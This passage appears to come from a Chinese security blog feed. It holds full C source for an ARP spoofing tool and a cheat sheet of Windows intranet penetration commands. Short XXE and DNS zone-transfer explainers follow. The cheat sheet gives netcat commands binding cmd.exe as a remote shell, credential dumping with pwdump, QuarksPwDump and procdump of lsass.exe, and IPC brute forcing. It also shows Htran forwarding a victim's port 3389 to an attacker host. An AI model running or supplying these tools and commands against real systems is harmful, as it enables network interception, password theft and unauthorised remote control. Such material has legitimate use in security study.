class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ARP攻击程序源代码</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;packet32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddndis.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MY_ARP_CHEAT_INCLUDE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_ARP_CHEAT_INCLUDE_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字节对齐必须是1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack (1)</span></span><br><span class="line"><span class="keyword">struct</span> ethernet_head</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_mac[<span class="number">6</span>]; <span class="comment">//目标主机MAC地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> source_mac[<span class="number">6</span>]; <span class="comment">//源端MAC地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> eh_type; <span class="comment">//以太网类型</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> arp_head</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> hardware_type; <span class="comment">//硬件类型：以太网接口类型为1</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> protocol_type; <span class="comment">//协议类型：IP协议类型为0X0800</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> add_len; <span class="comment">//硬件地址长度：MAC地址长度为6B</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> pro_len; <span class="comment">//协议地址长度：IP地址长度为4B</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> option; <span class="comment">//操作：ARP请求为1，ARP应答为2</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> sour_addr[<span class="number">6</span>]; <span class="comment">//源MAC地址：发送方的MAC地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> sour_ip; <span class="comment">//源IP地址：发送方的IP地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> dest_addr[<span class="number">6</span>]; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> padding[<span class="number">18</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> arp_packet <span class="comment">//最终arp包结构</span></span><br><span class="line">&#123;</span><br><span class="line">	ethernet_head eth; <span class="comment">//以太网头部</span></span><br><span class="line">	arp_head arp; <span class="comment">//arp数据包头部</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack ()</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE];   <span class="comment">//错误缓冲区</span></span><br><span class="line">	<span class="keyword">int</span> times;	<span class="comment">//	发送次数</span></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *packet;	<span class="comment">//ARP包</span></span><br><span class="line">	<span class="keyword">pcap_t</span> *adhandle;	<span class="comment">//一个pcap实例</span></span><br><span class="line">	<span class="keyword">pcap_if_t</span> *alldevs;	<span class="comment">//	全部网卡列表</span></span><br><span class="line">	<span class="keyword">pcap_if_t</span> *device;	<span class="comment">//	一个网卡</span></span><br><span class="line">	<span class="keyword">int</span> inum;	<span class="comment">//	用户选择的网卡序号</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//	获得本机网卡列表</span></span><br><span class="line">	<span class="keyword">if</span> (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error in pcap_findalldevs: %s\n"</span>, errbuf);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	打印网卡列表</span></span><br><span class="line">	<span class="keyword">for</span> (device = alldevs; device; device = device-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>, ++i);</span><br><span class="line">		<span class="keyword">if</span> (device-&gt;description)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">". %s\n"</span>, device-&gt;description);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">". No description available\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	如果没有发现网卡</span></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\nNo interfaces found! Make sure WinPcap is installed.\n"</span>);</span><br><span class="line">		return <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//	请用户选择一个网卡</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Enter the interface number (1-%d):"</span>, i);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>, &amp;inum);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	移动指针到用户选择的网卡</span></span><br><span class="line">	<span class="keyword">for</span> (device = alldevs, i = <span class="number">0</span>; i&lt; inum - <span class="number">1</span>; device = device-&gt;next, i++);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> chs_src_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> chs_dest_ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_src_ip = <span class="number">0u</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ul_dest_ip = <span class="number">0u</span>;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input the src ip(192.168.1.1):"</span>);</span><br><span class="line">	gets_s(chs_src_ip);</span><br><span class="line">	</span><br><span class="line">	ul_src_ip = inet_addr(chs_src_ip);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input the dest ip(192.168.1.100):"</span>);</span><br><span class="line">	gets_s(chs_dest_ip);</span><br><span class="line">	ul_dest_ip = inet_addr(chs_dest_ip);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_src_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> uchs_dest_mac[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input source mac address(30 AD 23 A3 FC CD):"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_src_mac[<span class="number">0</span>], &amp;uchs_src_mac[<span class="number">1</span>], &amp;uchs_src_mac[<span class="number">2</span>],</span><br><span class="line">		&amp;uchs_src_mac[<span class="number">3</span>], &amp;uchs_src_mac[<span class="number">4</span>], &amp;uchs_src_mac[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input dest mac address(30 AD 23 A3 FC CD):"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%x%x%x%x%x%x"</span>, &amp;uchs_dest_mac[<span class="number">0</span>], &amp;uchs_dest_mac[<span class="number">1</span>], &amp;uchs_dest_mac[<span class="number">2</span>],</span><br><span class="line">		&amp;uchs_dest_mac[<span class="number">3</span>], &amp;uchs_dest_mac[<span class="number">4</span>], &amp;uchs_dest_mac[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Input send times:"</span>);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>, &amp;times);</span><br><span class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 打开网卡 */</span></span><br><span class="line">	<span class="keyword">if</span> ((adhandle = pcap_open(device-&gt;name,          <span class="comment">// name of the device</span></span><br><span class="line">		<span class="number">65536</span>,            <span class="comment">// portion of the packet to capture</span></span><br><span class="line">		<span class="number">0</span>,                <span class="comment">//open flag</span></span><br><span class="line">		<span class="number">1000</span>,             <span class="comment">// read timeout</span></span><br><span class="line">		NULL,             <span class="comment">// authentication on the remote machine</span></span><br><span class="line">		errbuf            <span class="comment">// error buffer</span></span><br><span class="line">		)) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nUnable to open the adapter. %s is not supported by WinPcap\n"</span>,</span><br><span class="line">			device-&gt;name);</span><br><span class="line">		<span class="comment">/* Free the device list */</span></span><br><span class="line">		pcap_freealldevs(alldevs);</span><br><span class="line">		return <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的</span></span><br><span class="line">	packet = BuildArpPacket(uchs_src_mac, uchs_dest_mac, ul_src_ip, ul_dest_ip);</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt;= times)</span><br><span class="line">	&#123;</span><br><span class="line">		pcap_sendpacket(adhandle, packet, <span class="number">60</span>);</span><br><span class="line">		Sleep(<span class="number">100</span>);		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d:%s--&gt;%s\n"</span>,j, chs_src_ip,chs_dest_ip);</span><br><span class="line">		j++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"end!!!\n"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">BuildArpPacket</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_mac, <span class="keyword">unsigned</span> <span class="keyword">char</span>* dest_mac,</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> src_ip, <span class="keyword">unsigned</span> <span class="keyword">long</span> dest_ip)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">struct</span> arp_packet packet;</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.eth.dest_mac, dest_mac, <span class="number">6</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.eth.source_mac, source_mac, <span class="number">6</span>);</span><br><span class="line">	packet.eth.eh_type = htons(<span class="number">0x0806</span>);</span><br><span class="line"></span><br><span class="line">	packet.arp.hardware_type = htons(<span class="number">0x0001</span>);</span><br><span class="line">	packet.arp.protocol_type = htons(<span class="number">0x0800</span>);</span><br><span class="line">	packet.arp.add_len = <span class="number">0x06</span>;</span><br><span class="line">	packet.arp.pro_len = <span class="number">0x04</span>;</span><br><span class="line">	</span><br><span class="line">	packet.arp.option = htons(<span class="number">0x0002</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.arp.sour_addr, source_mac, <span class="number">6</span>);</span><br><span class="line">	packet.arp.sour_ip = src_ip;</span><br><span class="line">	<span class="built_in">memcpy</span>(packet.arp.dest_addr, dest_mac, <span class="number">6</span>);</span><br><span class="line">	packet.arp.dest_ip = dest_ip;</span><br><span class="line">	<span class="built_in">memset</span>(packet.arp.padding, <span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line">	return (unsigned char*)&amp;packet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;ARP-协议是什么&quot;&gt;&lt;a href=&quot;#ARP-协议是什么&quot; class=&quot;headerlink&quot; title=&quot;ARP 协议是
    
    </summary>
    
    
      <category term="ARP欺骗" scheme="http://www.evilclay.com/tags/ARP%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透常用工具命令速记</title>
    <link href="http://www.evilclay.com/2016/10/27/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4%E9%80%9F%E8%AE%B0/"/>
    <id>http://www.evilclay.com/2016/10/27/Windows内网渗透常用工具命令速记/</id>
    <published>2016-10-27T15:36:24.000Z</published>
    <updated>2016-10-27T16:20:04.278Z</updated>
    
    <content type="html"><![CDATA[<p>建立 IPC 连接（需要139 or 445 端口）：</p>
<pre><code>net use \\ip\ipc$ /user:username password
net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
net use z: \\ip\C$            // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘
copy c:\123.txt \\ip\C$\111\     // 把本地 123.txt 复制到对方 C 盘 111 目录下
net view \\ip            // 显示远程主机的共享
net share        // 查看本地已开启的共享
net share ipc$  // 本机开启 IPC 服务
</code></pre><p>AT 计划任务：</p>
<pre><code>net time \\ip        // 查看 远程 IP 上的系统时间
at \\ip 时间 程序名 or 系统命令
</code></pre><p>PsExec :</p>
<pre><code>PsExec \\&lt;ip&gt; -u user -p pass cmd
</code></pre><p>PwDump:</p>
<pre><code>pwdump7.exe (Dump system passwords)
pwdump7.exe -s (Dump passwords from files)
pwdump7.exe -d [sourcefile] [destionation] (Copy filename to destionation) // 可以复制进程调用的文件
pwdump7.exe -h (Show this help)
pwdump6.exe -x &lt;dst_ip&gt; // 需要与 dst_ip 建立 IPC 通道，而且是pwdump6版本有这个功能
</code></pre><p>NC:</p>
<pre><code>nc 192.168.1.1 5678　　连接.100的5678端口
nc -vv -lp  22222 -t -e cmd.exe   监听本地22222端口并反弹CMD

nc -vv -lp 23333 // 监听 本地23333端口
nc 192.16.1.1 23333 -t -e cmd  // 连接远程23333端口并绑定 CMD
</code></pre><p>GetPass:</p>
<pre><code>//  闪电小子 根据 minikatz 编译的工具，分为32位和64位，可以直接过去明文密码。
</code></pre><p>QuarksPwDump</p>
<pre><code>// 支持 Windows XP / 2003 / Vista / 7 / 2008 / 8
QuarksPwDump.exe -dhl  // 抓取本地 hash
QuarksPwDump.exe -k   // 获得系统秘钥
</code></pre><p>ProcDump：</p>
<pre><code>// lsass.exe 是Windows安全策略，权威域认证，AD管理的关键组件
procdump.exe -accepteula -ma lsass.exe lsass.dmp  // 下载内存文件到本地
</code></pre><p>IPC批处理爆破：</p>
<pre><code>ipc_crack.bat IP Username Passwordfile.txt
</code></pre><p>hscan：</p>
<pre><code>hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -ftp        //  使用FTP弱点模块探测
hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -all        //  加载所有弱点模块探测
</code></pre><p>ftpscan：</p>
<pre><code>ftpscan.exe &lt;start_ip&gt;-&lt;end_ip&gt; 200            // 开启200线程扫描制定 IP 段
                                            // 使用的是默认字典 username.dic password.dic
</code></pre><p>Port2Port：</p>
<pre><code>Port2Port.exe 2333 &lt;ip&gt; port                    // 把 本地 2333 端口转发到 远程 port
</code></pre><p>铁鹰PortTransfer：</p>
<pre><code>PortTransfer.exe -listen  &lt;本地 监听端口&gt;  &lt;本地 反弹端口&gt;
PortTransfer.exe -remote &lt;远程 IP&gt; &lt;远程 端口&gt; 127.0.0.1 &lt;本地 监听端口&gt;
</code></pre><p>Fpipe:</p>
<pre><code>在跳板机上运行：fpipe -l 81 -r 22 &lt;远程IP&gt;
//把 远程IP 的 22 端口映射到跳板机 81端口，默认使用高端口转发流量。

或者：

在跳板机上运行：fpipe -l 81 -s 82 -r 22 &lt;远程IP&gt;
//把 远程IP 的 22 端口映射到跳板机 81端口，并且指定82端口来转发流量。
</code></pre><p>Htran:</p>
<pre><code>HTran2.4.exe -p -Listen 11111 22222
// 攻击端 IP 执行
// 开启 11111 22222 端口 并把 11111 的流量转发给 22222

HTran2.4.exe -p -slave &lt;攻击端 IP&gt; 11111 127.0.0.1 3389
// 被攻击端IP 执行
// 把 本地 3389 端口转发到 攻击机 的 11111端口
</code></pre><p>目前整理了这些工具，定会疏漏，欢迎大黑牛告诉小弟，我来补充下~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;建立 IPC 连接（需要139 or 445 端口）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net use \\ip\ipc$ /user:username password
net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.evilclay.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="安全工具" scheme="http://www.evilclay.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>XML外部实体注入（XXE）漏洞分析及漏洞场景探索</title>
    <link href="http://www.evilclay.com/2016/10/11/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%88XXE%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E6%8E%A2%E7%B4%A2/"/>
    <id>http://www.evilclay.com/2016/10/11/XML外部实体注入（XXE）漏洞分析及漏洞场景探索/</id>
    <published>2016-10-11T15:16:07.000Z</published>
    <updated>2016-10-13T15:57:53.126Z</updated>
    
    <content type="html"><![CDATA[<h2 id="闲扯"><a href="#闲扯" class="headerlink" title="闲扯"></a>闲扯</h2><p>发呆这种事情真的有毒，想到3年前一个前辈问我的一个技术问题，<strong>当你拿到一个非 ROOT 权限的注入点后，如何获得 系统的 ROOT/SYSTEM 权限</strong>，实话说，到今天我依然回答不出来一个我想要的答案，突然间一种技术止步不前的危机感，实在惶恐(惶恐是因为明明刚入门的骚年就有这种感觉了，可怕)，就在不久前的一次ShowCase上，牛叉的 no 老师在提权这块给我一些实用的思路，回想起来有以下三种方法：</p>
<ol>
<li>查看 系统内的 补丁安装情况，以及安装了那些软件或者组件，利用系统或者软件本身的漏洞使用对用的 EXP 进行提权操作。</li>
<li>手机数据库以及可接触到的文件各种账户信息（Web后台账户，DB账户），分析邮件，密码规则，对高权限的账户进行 Fuzz。</li>
<li>针对不同的数据库（SQLServer，MySQL，Oracle）使用不同的提权技巧，比如 SQLServer，可以利用有写日志权限的账户把新建administrator权限的账户代码写入到.hta后缀的日志中，把该日志文件放到系统的启动项文件夹，当系统重启的时候自动会给你创建系统权限的账户。</li>
</ol>
<p>针对上面的三条依然停留在概念阶段，由其是第三条被动提权的方式一定很好玩，准备过两周对提权这块好好研究研究。在这里Mark一下。</p>
<p>对于渗透测试有一种见一种打一套的感觉，尤其是听了 No 老师的分享之后，也就觉得技能反而没这么重要了，重要的是实战经验。多 x 站，多分析，以后遇到某种情况心中自然满是套路，23333. 有一种阅片无数心中自然无码的感觉，哦不对，是胸有成竹的感觉: )</p>
<p>所谓套路就是就是一些正常打法，就像解一道数学题一样，咱们一步一步来，这步走不通或者解法十分复杂就换一个切入段使用第二种解法。不错，这很 Nice。如果心中自有方圆，一套一套的打下去估计也该心满意足了。</p>
<p>谈到猥琐流，卧槽，牛逼啊，能猥琐说明了咱已经熟练的掌握了正规的打法，也就是所谓的套路，不然连一个正常的套路都打不出来的话又何谈猥琐呢？ 所以说：</p>
<blockquote>
<p>要想猥琐，先学套路！</p>
<p>要想猥琐，先学套路！</p>
<p>要想猥琐，先学套路！</p>
</blockquote>
<p>闲扯了这些，没啥卵用，但就是想扯，毕竟我有点控计不住我子鸡了。</p>
<p>下面步入正题，这周看了下 XXE 相关的文章，最终目的很简单，就是想看看 XXE 的漏洞该怎么去挖，在一步步走向终点的过程中，会学习什么是 XXE，XXE 漏洞对应代码/程序的使用场景，以及为什么会出现XXE。</p>
<p>XXE（XML外部实体注入）是针对于使用 XML 交互的Web应用程序攻击方法，是一种服务端攻击方式。Web程序（PHP，Java，Python）在解析不安全的 XML 的文件的时候由于没有正确的安全效验导致 XXE 的产生。又应证了一句话，”All inputs are EVAL!”，所以说漏洞出现的地方就是用到了XML方式交互数据的地方。</p>
<h2 id="什么是-XML-External-Entity"><a href="#什么是-XML-External-Entity" class="headerlink" title="什么是 XML External Entity"></a>什么是 XML External Entity</h2><p>一般来说，XML 是一种用来定义数据的一种文件格式，类似于 JSON，倒是近些年由于基于 API 开发的盛行，使用 JSON 作为前后端数据交换的格式火了起来。一般的 XML 文件格式如下：</p>
<pre><code>&lt;worker&gt;
    &lt;name&gt;Anka9080&lt;/name&gt;
    &lt;slogan&gt;PPAP&lt;/slogan&gt;
&lt;/worker&gt;
</code></pre><p>一个完整的 XML 文件应该包含 XML声明(可选)，文档类型定义（可选），文档元素三个部分。</p>
<p><img src="./xml_stru.png" alt=""></p>
<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>如图所示 DTD 是在文档内声明，若外部声明 DTD 需要以 SYSTEM 或者 PUBLIC 作为关键字进行声明：</p>
<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
</code></pre><p>或者：</p>
<pre><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;
</code></pre><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>内部声明使用 <code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
<p>外部声明同样使用 SYSTEM 或者 PUBLIC 关键字：</p>
<pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
</code></pre><p>或者</p>
<pre><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;
</code></pre><h2 id="什么是-XXE注入"><a href="#什么是-XXE注入" class="headerlink" title="什么是 XXE注入"></a>什么是 XXE注入</h2><p>通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害，有一种 SSRF 的Feel~</p>
<p>引入外部实体的方式有很多种，如下：</p>
<ol>
<li>直接引入本地文件</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;闲扯&quot;&gt;&lt;a href=&quot;#闲扯&quot; class=&quot;headerlink&quot; title=&quot;闲扯&quot;&gt;&lt;/a&gt;闲扯&lt;/h2&gt;&lt;p&gt;发呆这种事情真的有毒，想到3年前一个前辈问我的一个技术问题，&lt;strong&gt;当你拿到一个非 ROOT 权限的注入点后，如何获得 系统的 RO
    
    </summary>
    
    
      <category term="XXE" scheme="http://www.evilclay.com/tags/XXE/"/>
    
      <category term="闲扯" scheme="http://www.evilclay.com/tags/%E9%97%B2%E6%89%AF/"/>
    
  </entry>
  
  <entry>
    <title>DNS服务器探测及DNS区域传送</title>
    <link href="http://www.evilclay.com/2016/10/10/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A2%E6%B5%8B%E5%8F%8ADNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81/"/>
    <id>http://www.evilclay.com/2016/10/10/DNS服务器探测及DNS区域传送/</id>
    <published>2016-10-10T01:09:51.000Z</published>
    <updated>2016-10-10T01:11:19.091Z</updated>
    
    <content type="html"><![CDATA[<h4 id="DNS-枚举"><a href="#DNS-枚举" class="headerlink" title="DNS 枚举"></a>DNS 枚举</h4><blockquote>
<p>NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析<br>MX记录      记录邮件服务器的IP地址</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令  dnsenum foo.com</span><br></pre></td></tr></table></figure>
<p>用来定位 DNS 服务器 以及 邮件服务器。</p>
<p>在主备服务器之间同步数据库，需要使用“DNS域传送”</p>
<p>DNS 域传送漏洞就是 向存在漏洞的DNS服务器发送请求，会返回某个域的所有记录，造成网络拓扑被泄露的危险。</p>
